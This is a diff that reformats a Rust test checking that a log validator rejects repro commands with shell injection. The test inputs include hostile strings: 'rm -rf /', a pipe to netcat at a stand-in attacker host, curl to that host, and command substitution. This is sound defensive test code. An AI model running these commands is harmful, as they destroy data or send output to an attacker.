@@ -2491,8 +2491,14 @@ mod tests {
     fn zmzwof_validate_e2e_log_rejects_shell_meta_in_repro_command() {
         let cases: &[(&str, &str)] = &[
             ("rm -rf / ; rch exec -- cargo test", "shell metacharacter"),
-            ("rch exec -- cargo test | nc evil.example 4444", "shell metacharacter"),
-            ("rch exec -- cargo test && curl evil.example", "shell metacharacter"),
+            (
+                "rch exec -- cargo test | nc evil.example 4444",
+                "shell metacharacter",
+            ),
+            (
+                "rch exec -- cargo test && curl evil.example",
+                "shell metacharacter",
+            ),
             ("rch exec -- cargo test `whoami`", "shell metacharacter"),
             ("rch exec -- cargo test\nrm -rf /", "shell metacharacter"),
             ("rch exec -- cargo test $(whoami)", "shell substitution"),
@@ -2520,7 +2526,9 @@ mod tests {
         entry["repro_command"] = json!("env FOO=bar rch exec -- cargo test");
         let violations = validate_e2e_log_json(&entry.to_string());
         assert!(
-            violations.iter().any(|v| v.contains("must START with 'rch exec'")),
+            violations
+                .iter()
+                .any(|v| v.contains("must START with 'rch exec'")),
             "should reject prologue before rch exec: {violations:?}"
         );
     }
